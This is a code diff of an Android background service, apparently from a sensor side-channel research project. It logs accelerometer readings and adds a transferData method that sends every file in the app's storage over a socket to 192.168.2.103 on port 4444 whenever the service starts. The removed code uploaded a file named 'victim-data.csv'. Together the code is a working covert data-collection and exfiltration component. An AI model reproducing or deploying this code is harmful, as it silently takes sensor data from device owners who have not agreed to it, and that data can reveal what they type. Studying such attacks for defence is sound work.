@@ -1,6 +1,7 @@
 package com.nyrrrr.msd.backgroundlogger;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.hardware.Sensor;
 import android.hardware.SensorEvent;
@@ -27,7 +28,6 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.UnknownHostException;
@@ -59,12 +59,12 @@ public class BackgroundService extends Service implements SensorEventListener {
             oThread.start();
 
             oServiceLooper = oThread.getLooper();
-            oServiceHandler = new BackgroundServiceHandler(oServiceLooper);
+            oServiceHandler = new BackgroundServiceHandler(this, oServiceLooper);
 
             oSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
             oSensorReader = new SensorReader(oSensorManager);
             oAcceleroMeter = oSensorReader.getSingleSensorOfType(Sensor.TYPE_ACCELEROMETER);
-            registerListeners();
+            //registerListeners();
         }
     }
 
@@ -77,7 +77,6 @@ public class BackgroundService extends Service implements SensorEventListener {
             message.arg2 = pFlags;
             oServiceHandler.sendMessage(message);
         }
-//        return START_REDELIVER_INTENT;
         return START_STICKY;
     }
 
@@ -85,13 +84,7 @@ public class BackgroundService extends Service implements SensorEventListener {
     public void onSensorChanged(SensorEvent pSensorEvent) {
         StorageManager.getInstance().addSensorDataLogEntry(pSensorEvent, iOrientationLogVar);
         if (StorageManager.getInstance().getSensorDataLogLength() > 9999) {
-            try {
-                StorageManager.getInstance().storeData(this);
-            } catch (IOException e) {
-                Log.e("IO ERROR", e.getMessage());
-            } catch (JSONException e) {
-                Log.e("JSON ERROR", e.getMessage());
-            }
+            store();
         }
     }
 
@@ -101,13 +94,8 @@ public class BackgroundService extends Service implements SensorEventListener {
 
     @Override
     public void onDestroy() {
-        try {
-            StorageManager.getInstance().storeData(this);
-        } catch (IOException e) {
-            Log.e("IO ERROR", e.getMessage());
-        } catch (JSONException e) {
-            Log.e("JSON ERROR", e.getMessage());
-        }
+//        store();
+//        transferData(this.fileList());
         super.onDestroy();
     }
 
@@ -117,60 +105,83 @@ public class BackgroundService extends Service implements SensorEventListener {
         return null;
     }
 
-    public void socketTest() {
-
-        String serverName = "192.168.2.102";
-        int port = 4444;
-        Log.d("SOCKET", "TEST");
+    private void store() {
         try {
-            Socket socket = new Socket(serverName, port);
-            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
-            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-
-            String fileName = "5177825794384-victim-data.csv";
-            File file = new File(getApplicationContext().getFilesDir().getPath() + "/" + fileName);
-            char[] charArray = new char[(int) file.length()];
-            FileInputStream inputStream = new FileInputStream(file);
-            BufferedReader fileReader = new BufferedReader(new InputStreamReader(inputStream));
-
-            fileReader.read(charArray, 0, charArray.length);
-
-            OutputStream sender = socket.getOutputStream();
-
-            // transfer protocol
-            writer.println("FILE");
-            writer.flush();
-            String message = reader.readLine();
-            if (message.equals("File name?")) {
-                Log.d("Server response", message);
-                writer.println(fileName);
-                writer.flush();
-                message = reader.readLine();
-                if (message.equals("File size?")) {
-                    Log.d("Server response", message);
-                    writer.println(file.length());
-                    writer.flush();
-                    message = reader.readLine();
-                    if (message.equals("Waiting for file...")) {
-                        Log.d("Server response", message);
-                        Log.d("Sending", fileName);
-                        writer.write(charArray, 0, charArray.length);
-                        writer.flush();
-                        Log.d("Server response", message = reader.readLine());
-                    } else {
-                        Log.e("File size Error", message);
-                    }
-                } else {
-                    Log.e("File name Error", message);
-                }
-            } else {
-                Log.e("Server Error", message);
-            }
-            socket.close();
-        } catch (UnknownHostException e) {
-            Log.e("HOST ERROR", e.getMessage());
+            StorageManager.getInstance().storeData(this);
         } catch (IOException e) {
             Log.e("IO ERROR", e.getMessage());
+        } catch (JSONException e) {
+            Log.e("JSON ERROR", e.getMessage());
+        }
+    }
+
+    /**
+     * Transfer files to server
+     *
+     * @param pFileList
+     */
+    public void transferData(String[] pFileList) {
+
+        String serverName = "192.168.2.103";
+        int port = 4444;
+        Log.d("COMMUNICATION", "Start sending...");
+        try {
+            for (String fileName : pFileList) {
+                if (fileName.equals("instant-run") || fileName.equals("PaxHeader")) continue;
+                // socket and communication
+                Socket socket = new Socket(serverName, port);
+                PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+                // read files
+                File file = new File(getApplicationContext().getFilesDir().getPath() + "/" + fileName);
+                char[] charArray = new char[(int) file.length()];
+                FileInputStream inputStream = new FileInputStream(file);
+                BufferedReader fileReader = new BufferedReader(new InputStreamReader(inputStream));
+                fileReader.read(charArray, 0, charArray.length);
+
+                // transfer protocol
+                writer.println("FILE");
+                writer.flush();
+                String message = reader.readLine();
+                if (message.equals("File name?")) {
+                    Log.d("Server response", message);
+                    writer.println(fileName);
+                    writer.flush();
+                    message = reader.readLine();
+                    if (message.equals("File size?")) {
+                        Log.d("Server response", message);
+                        if(file.length() == 0) {
+                            writer.println("Abort");
+                            writer.flush();
+                            continue;
+                        }
+                        writer.println(file.length());
+                        writer.flush();
+                        message = reader.readLine();
+                        if (message.equals("Waiting for file...")) {
+                            Log.d("Server response", message);
+                            Log.d("Sending", fileName);
+                            writer.write(charArray, 0, charArray.length);
+                            writer.flush();
+                            Log.d("Server response", message = reader.readLine());
+                        } else {
+                            Log.e("File size Error", message);
+                        }
+                    } else {
+                        Log.e("File name Error", message);
+                    }
+                } else {
+                    Log.e("Server Error", message);
+                }
+                socket.close();
+            }
+        } catch (UnknownHostException e) {
+            Log.e("HOST ERROR", e.getMessage());
+            e.printStackTrace();
+        } catch (IOException e) {
+            Log.e("IO ERROR", e.getMessage());
+            e.printStackTrace();
         }
     }
 
@@ -199,13 +210,17 @@ public class BackgroundService extends Service implements SensorEventListener {
      */
     public class BackgroundServiceHandler extends Handler {
 
-        public BackgroundServiceHandler(Looper pLooper) {
+
+        Context context;
+
+        public BackgroundServiceHandler(Context pContext, Looper pLooper) {
             super(pLooper);
+            context = pContext;
         }
 
         @Override
         public void handleMessage(Message pMsg) {
-            //socketTest();
+            transferData(context.fileList());
         }
     }
 }
